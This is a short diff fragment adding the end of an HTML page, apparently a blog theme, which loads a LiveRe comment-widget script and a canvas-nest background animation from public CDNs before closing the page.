+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
